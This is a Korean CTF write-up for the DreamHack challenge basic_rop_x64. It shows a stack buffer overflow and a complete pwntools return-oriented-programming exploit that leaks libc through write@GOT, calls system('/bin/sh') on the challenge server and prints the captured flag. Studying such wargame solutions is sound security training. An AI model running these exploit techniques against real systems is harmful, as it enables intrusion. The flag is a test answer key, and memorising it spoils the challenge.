# [DreamHack] basic_rop_x64

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(basic_rop_x64)의 바이너리와 소스 코드가 주어집니다.
> Return Oriented Programming 공격 기법을 통해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [basic_rop_x64.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8547675/basic_rop_x64.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159834734-ca90ad12-676a-4155-aa75-19bd49cf4954.png)

## Analysis

```c
int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

`read(0, buf, 0x400)`에서 BOF가 발생한다. `main()`의 return address를 덮어서 ROP를 수행할 수 있다.

## Exploit

### Leak libc

`write()`의 GOT에 저장된 데이터를 출력하여 libc 주소를 leak할 수 있다. `pop rdx` 가젯이 바이너리에 없는데, `main()`이 return될 때 `rdx`가 `0x40`으로 세팅되어 있기 때문에 건드리지 않아도 된다. `rdi`도 마찬가지로 1로 세팅되어 있기 때문에 건드리지 않아도 된다.

```python
# leak libc

payload = b'a' * 0x48 # dummy
payload += p64(pop_rsi_r15)
payload += p64(write_got)
payload += p64(0)
payload += p64(write_plt)

r.send(payload)
r.recvn(0x40)
write = u64(r.recvn(8)) # write()
libc = write - write_offset # libc base
```

### Return to main / Call system("/bin/sh")

```python
# call system("/bin/sh")

payload = b'a' * 0x48 # dummy
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

r.send(payload)
```

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/basic_rop_x64')
    write_offset = 0x1100f0
    system_offset = 0x4f420
    binsh_offset = 0x1b3d88
else:
    r = remote('host1.dreamhack.games', 23040)
    write_offset = 0xf72b0
    system_offset = 0x45390
    binsh_offset = 0x18cd57

pop_rdi = 0x400883  # pop rdi; ret
pop_rsi_r15 = 0x400881  # pop rsi; pop r15; ret
write_got = 0x601020  # GOT of write()
write_plt = 0x4005d0  # PLT of write()
main = 0x4007ba  # main()


# leak libc

payload = b'a' * 0x48  # dummy
payload += p64(pop_rsi_r15)
payload += p64(write_got)
payload += p64(0)
payload += p64(write_plt)
payload += p64(main)  # return to main

r.send(payload)
r.recvn(0x40)
write = u64(r.recvn(8))  # write()
libc = write - write_offset  # libc base
system = libc + system_offset  # system()
binsh = libc + binsh_offset  # "/bin/sh"


# call system("/bin/sh")

payload = b'a' * 0x48  # dummy
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

r.send(payload)


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 23040: Done
[*] Switching to interactive mode
\x00)hp\x7f\x00P\xd2+hp\x7f\x00@g\x1ep\x7f\x00\xc0\xb3\x1fp\x7f\x00p^#hp\x7f\x006\x06\x00\x00\x00\x00\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$ cat flag
DH{357ad9f7c0c54cf85b49dd6b7765fe54}
```